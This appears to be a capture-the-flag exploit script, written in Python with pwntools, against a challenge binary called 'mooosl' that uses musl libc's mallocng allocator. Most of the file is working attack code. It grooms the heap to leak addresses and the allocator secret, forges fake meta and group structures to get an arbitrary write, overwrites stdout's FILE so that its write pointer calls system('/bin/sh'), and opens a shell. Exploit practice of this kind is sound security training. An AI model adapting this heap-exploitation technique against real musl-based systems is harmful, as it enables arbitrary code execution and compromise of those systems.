from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('mooosl')
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/musl/musl-1.2.2/build/lib/libc.so')
libc = ELF('libc.so')
# libc = ELF('/lib/x86_64-linux-musl/libc.so') 
elf = ELF('mooosl')


def add(key_size, key, value_size, value):
    io.sendlineafter('option: ', '1')
    io.sendlineafter('key size: ', str(key_size))
    io.sendafter('key content: ', key)
    io.sendlineafter('value size: ', str(value_size))
    io.sendafter('value content: ', value)


def query(key_size, key):
    io.sendlineafter('option: ', '2')
    io.sendlineafter('key size: ', str(key_size))
    io.sendafter('key content: ', key)


def delete(key_size, key):
    io.sendlineafter('option: ', '3')
    io.sendlineafter('key size: ', str(key_size))
    io.sendafter('key content: ', key)


def find_key(length = 0x10, hash = 0x7e5):
    while True:
        x = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
        if get_hash(x) == hash:
            return x


def get_hash(content):
    hash = 0x7e5
    for chr in content:
        hash = ord(chr) + hash * 0x13377331
    return hash & 0xfff


def turn_little_end(number):
    result = 0
    for i in range(8):
        result += (int(number[2 * i:2 * i +2], 16) << (8 * i)) 
    return result


def pwn():
    add(1, 'a', 1, 'b')                 # AAAAAAU       # U to prevent dequeue when all chunk is freed
    for _ in range(5):
        query(0x30, 'a' * 0x30)         # AFFFFFU
    add(1, b'\n', 0x30, 'b' * 0x30)     # UFFFFFU -> UAAAAAU -> UAAAA[U]U
    # key = find_key()
    # print(key)
    key = 'eJpYP1Yx2v9R5v53'
    add(0x10, key, 1, 'c')              # UAAAU[U]U
    delete(1, b'\n')                    # FAAAU[F]U
    for _ in range(3):
        query(0x30, 'c' * 0x30)         # FFFFU[F]U
    add(0x1200, 'A\n', 1, 'd')          # AAAAU[U]U
    query(1, '\n')
    io.recvuntil('0x30:')
    data = io.recvline()
    mmap_base = turn_little_end(data[:0x10]) - 0x20
    chunk_addr = turn_little_end(data[0x10:0x20])
    # libc_base = mmap_base + 0x4000    # with aslr
    libc_base = mmap_base + 0xa000      # without aslr

    for _ in range(3):
        query(0x30, 'd' * 0x30)         # AFFFU[U]U
    payload = p64(0) + p64(chunk_addr - 0x60) + p64(0) + p64(0x30) + p64(0x7e5) + p64(0)
    query(0x30, payload)                # FFFFU[U]U
    query(1, '\n')
    io.recvuntil('0x30:')
    data = io.recvline()
    meta = turn_little_end(data[:0x10])
    meta_area = meta - 0x1d0
    for _ in range(3):
        query(0x30, 'd' * 0x30)         # AFFFU[U]U
    payload = p64(0) + p64(meta_area) + p64(0) + p64(0x30) + p64(0x7e5) + p64(0)
    query(0x30, payload)                # FFFFU[U]U
    query(1, '\n')
    io.recvuntil('0x30:')
    data = io.recvline()
    secret = turn_little_end(data[:0x10])
    log.success('mmap_base: ' + hex(mmap_base))
    log.success('chunk_addr: ' + hex(chunk_addr))
    log.success('libc_base: ' + hex(libc_base))
    log.success('meta: ' + hex(meta))
    log.success('meta_area: ' + hex(meta_area))
    log.success('secret: ' + hex(secret))

    fake_meta_area_addr = mmap_base + 0x2000
    fake_meta_addr = mmap_base + 0x2010
    fake_group_addr = fake_meta_addr + 0x30
    __stdout_FILE = libc_base + 0xb4280
    log.success('fake_meta_area_addr: ' + hex(fake_meta_area_addr))
    log.success('fake_meta_addr: ' + hex(fake_meta_addr))
    log.success('fake_group_addr: ' + hex(fake_group_addr))
    log.success('__stdout_FILE: ' + hex(__stdout_FILE))

    # unlink to write a fake meta before __stdout_FILE, (__stdout_FILE - 0x18)->next = (fake_meta_addr + 0x30);
    fake_meta_area = p64(secret) + p64(0)
    last_idx, freeable, sc, maplen = 0, 1, 8, 1     # 0x90
    fake_meta  = p64(__stdout_FILE - 0x18)          # prev
    fake_meta += p64(fake_meta_addr + 0x30)         # next
    fake_meta += p64(fake_group_addr)               # mem
    fake_meta += p32(0) * 2                         # avail_mask, freed_mask
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
    fake_meta += p64(0)
    fake_group  = p64(fake_meta_addr)               # meta
    fake_group += p64(1)                            # active_idx + pad
    padding = b'a' * 0xaa0
    payload = padding + fake_meta_area + fake_meta + fake_group + b'\n'
    query(0x1200, payload)
    for _ in range(2):
        query(0x30, 'e' * 0x30)         # AAFFU[U]U
    payload = p64(0) + p64(fake_group_addr + 0x10) + p64(0) + p64(0x30) + p64(0x7e5) + p64(0)
    add(1, 'a', 0x30, payload)          # UUFFU[U]U
    delete(1, b'\n')                    # FUFFU[U]U

    # queue() to link fake_meta into __malloc_context.active[8]
    fake_meta_area = p64(secret) + p64(0)
    last_idx, freeable, sc, maplen = 1, 0, 8, 0     # 0x90
    fake_meta  = p64(0)                             # prev
    fake_meta += p64(0)                             # next
    fake_meta += p64(fake_group_addr)               # mem
    fake_meta += p32(0) * 2                         # avail_mask, freed_mask
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
    fake_meta += p64(0)
    fake_group  = p64(fake_meta_addr)               # meta
    fake_group += p64(1)                            # active_idx + pad
    padding = b'a' * 0xa90
    payload = padding + fake_meta_area + fake_meta + fake_group + b'\n'
    query(0x1200, payload)
    query(0x30, 'f' * 0x30)             # AUAFU[U]U
    payload = p64(0) + p64(fake_group_addr + 0x10) + p64(0) + p64(0x30) + p64(0x7e5) + p64(0)
    add(1, 'a', 0x30, payload)          # UUUFU[U]U
    delete(1, b'\n')                    # FUUFU[U]U

    # create fake_meta
    fake_meta_area = p64(secret) + p64(0)
    last_idx, freeable, sc, maplen = 1, 0, 8, 0     # 0x90
    fake_meta  = p64(fake_meta_addr)                # prev
    fake_meta += p64(fake_meta_addr)                # next
    fake_meta += p64(__stdout_FILE - 0x10)          # mem
    fake_meta += p32(1) + p32(0)                    # avail_mask, freed_mask
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
    fake_meta += b'a' * 0x18
    fake_meta += p64(__stdout_FILE - 0x10)          # fake_mem for fake_group at (__stdout_FILE - 0x10)
    padding = b'a' * 0xa80
    payload = padding + fake_meta_area + fake_meta + b'\n'
    query(0x1200, payload)
    
    fake_IO  = b'/bin/sh\x00'                       # flags
    fake_IO += p64(0)                               # rpos
    fake_IO += p64(0)                               # rend
    fake_IO += p64(libc_base + 0x5c9a0)             # close
    fake_IO += p64(1)                               # wend
    fake_IO += p64(1)                               # wpos
    fake_IO += p64(0)                               # mustbezero_1
    fake_IO += p64(0)                               # wbase
    fake_IO += p64(0)                               # read
    fake_IO += p64(libc_base + libc.sym['system'])  # write
    
    io.sendlineafter('option: ', '1')
    io.sendlineafter('key size: ', '1')
    io.sendafter('key content: ', 'a')
    # puts -> fputs -> fwrite -> __fwritex -> system("/bin/sh")
    io.sendlineafter('value size: ', str(0x80))
    # gdb.attach(io)
    io.send(fake_IO + b'\n')
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()

